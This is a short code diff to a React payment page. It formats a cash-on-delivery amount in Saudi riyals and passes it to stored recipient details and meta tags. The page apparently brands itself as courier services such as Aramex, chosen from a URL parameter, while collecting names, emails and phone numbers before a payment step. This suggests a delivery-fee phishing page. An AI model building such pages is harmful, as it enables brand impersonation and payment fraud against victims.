@@ -24,6 +24,9 @@ const PaymentRecipient = () => {
   
   const serviceName = linkData?.payload?.service_name || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const branding = getServiceBranding(serviceName);
+  const shippingInfo = linkData?.payload as any;
+  const amount = shippingInfo?.cod_amount || 500;
+  const formattedAmount = `${amount} ر.س`;
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -40,7 +43,8 @@ const PaymentRecipient = () => {
       name: customerName,
       email: customerEmail,
       phone: customerPhone,
-      service: serviceName
+      service: serviceName,
+      amount: formattedAmount
     }));
     navigate(`/pay/${id}/details`);
   };
@@ -49,7 +53,7 @@ const PaymentRecipient = () => {
     <>
       <PaymentMetaTags 
         serviceName={serviceName}
-        amount="500 ر.س"
+        amount={formattedAmount}
         title={`معلومات المستلم - ${serviceName}`}
         description={`أدخل معلومات المستلم لخدمة ${serviceName}`}
       />
